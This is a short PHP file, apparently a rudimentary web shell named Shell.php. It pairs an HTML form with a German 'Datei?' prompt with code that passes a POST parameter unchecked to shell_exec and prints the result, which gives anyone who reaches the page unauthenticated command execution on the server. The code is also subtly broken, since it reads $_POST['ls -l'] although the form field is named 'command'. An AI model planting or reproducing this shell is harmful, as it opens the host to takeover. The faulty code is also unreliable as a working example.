<form action="Shell.php" method="post">
Datei? <input type="text" name="command">
<input type="submit">
</form>

<?php
$command = $_POST["ls -l"];


echo "<pre>";
echo shell_exec($command);
echo "</pre>";

?>